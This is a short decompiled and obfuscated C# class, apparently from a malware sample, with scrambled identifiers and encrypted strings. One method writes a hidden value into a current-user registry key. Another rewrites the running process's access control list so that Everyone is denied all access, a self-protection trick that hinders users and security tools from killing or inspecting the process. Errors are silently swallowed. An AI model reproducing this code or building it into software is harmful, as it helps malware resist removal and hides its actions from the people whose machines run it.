using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace frgoWklvEOSV;

internal sealed class IWmRGYyQfUix
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr GrSdvvHiKreRSO, int zRUUBubcAQ, [Out] byte[] JNIdDLJEpjsayt, uint wiNRSuPDYdba, out uint fEIhtmCQgpuPPNfQ);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr bfktLaDiBlxV, int yplvNNBVlcMhJmF, [In] byte[] HLllnwhEbx);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void BBMgezuaVk(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107401936)));
			registryKey.SetValue(GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107402375)), getString_0(107402986));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor ptzttULnOn(IntPtr intptr_0)
	{
		byte[] jNIdDLJEpjsayt = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, jNIdDLJEpjsayt, 0u, out var fEIhtmCQgpuPPNfQ);
		if ((long)fEIhtmCQgpuPPNfQ > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, jNIdDLJEpjsayt = new byte[fEIhtmCQgpuPPNfQ], fEIhtmCQgpuPPNfQ, out fEIhtmCQgpuPPNfQ))
		{
			return null;
		}
		return new RawSecurityDescriptor(jNIdDLJEpjsayt, 0);
	}

	private void InNhoixZOCHZg(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void BhIQXAgdwzUYzv()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = ptzttULnOn(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			InNhoixZOCHZg(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static IWmRGYyQfUix()
	{
		Strings.CreateGetStringDelegate(typeof(IWmRGYyQfUix));
	}
}
